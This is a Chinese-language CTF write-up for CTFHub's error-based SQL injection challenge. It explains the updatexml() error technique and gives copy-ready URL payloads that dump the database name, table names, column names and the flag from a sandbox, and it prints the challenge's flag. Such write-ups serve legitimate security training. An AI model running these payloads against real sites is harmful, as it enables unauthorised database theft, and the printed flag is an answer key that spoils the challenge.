---
title: CTFHub-SQL注入-报错注入 Writeup
date: 2026-09-28
category: web
tags: [CTFHub, SQL注入, 报错注入]
---

## 题目背景与环境准备
• 题目名称：SQL报错注入
• 题目目标：利用 SQL 注入漏洞，获取数据库中的 flag 字段并提交。
• 靶场环境：打开 CTFHub 提供的沙盒地址（类似 http://challenge-xxx.sandbox.ctfhub.com:10800/）。


## 解题原理解析
 
什么是报错注入？
正常情况下，黑客输入代码，网站只会显示“正常”或“错误”，不会把数据库里的数据显示出来。
但是，如果网站设计者没有关闭“详细报错信息”，数据库在遇到语法错误时，会把它出错的那段内容打印在网页上。
报错注入的核心思想就是：故意制造语法错误，然后把我们要查的数据“夹带”在错误信息里，让数据库自己吐出来。
 
核心武器：MySQL 自带的 updatexml() 函数。
它原本是用来处理 XML 的，第二个参数必须是合法的 XPath 格式。如果不合法，它就会报错，并且把不合法的那个参数原封不动打印出来。我们就利用这一点，把要查的数据塞进这个参数里。


## 详细解题步骤
 
### 第一步：判断注入类型（极重要避坑）
• 怎么做：在网址后面输入 ?id=1，页面正常。然后改成 ?id=1'（加个单引号）。
• 现象：页面直接报错：You have an error in your SQL syntax... near ''。
• 结论：这是一个「整数型注入」！后台代码大概是 ...where id=1。

### 第二步：爆出当前数据库名（探路）
• 怎么做：在网址后面拼接下面这段代码（注意空格，建议直接复制）：
?id=1 and updatexml(1,concat(0x7e,database(),0x7e),1) --+
• 每一步的含义：
	• and：逻辑连接，让前面的查询正常执行，顺便执行我们后面的代码。
	• database()：MySQL 内置函数，用来查当前数据库名。
	• 0x7e：十六进制的波浪号 ~。它是 XPath 的非法字符，用来“逼”数据库报错。
	• --+：注释符，把后台原本 SQL 语句后面的内容注释掉，防止语法冲突。
• 预期回显：页面出现报错，显示 XPATH syntax error: '~sqli~'（sqli 就是数据库名，记住它）。

### 第三步：爆出表名
• 怎么做：假设刚才查到的库名是 sqli，替换到下面：
?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='sqli'),0x7e),1) --+
• 每一步的含义：
	• information_schema：MySQL 自带的“说明书”数据库，记录了所有表名。
	• group_concat()：把查到的多个表名拼成一串一次性带出来。
• 预期回显：报错信息显示 ~news,flag~。我们要找的表名是 flag。

### 第四步：爆出字段名（找抽屉里的盒子）
• 怎么做：把库名 sqli 和表名 flag 代入：
?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='sqli' and table_name='flag'),0x7e),1) --+
• 预期回显：报错显示 ~flag~。字段名也是 flag。

### 第五步：提取最终 Flag
• 怎么做：
?id=1 and updatexml(1,concat(0x7e,(select flag from flag),0x7e),1) --+
• 预期回显：页面报错显示类似 XPATH syntax error: '~ctfhub{xxxxxxxx}~'。这就是 Flag！

## Flag
ctfhub{9d1d100c32ee57f04f51667a}
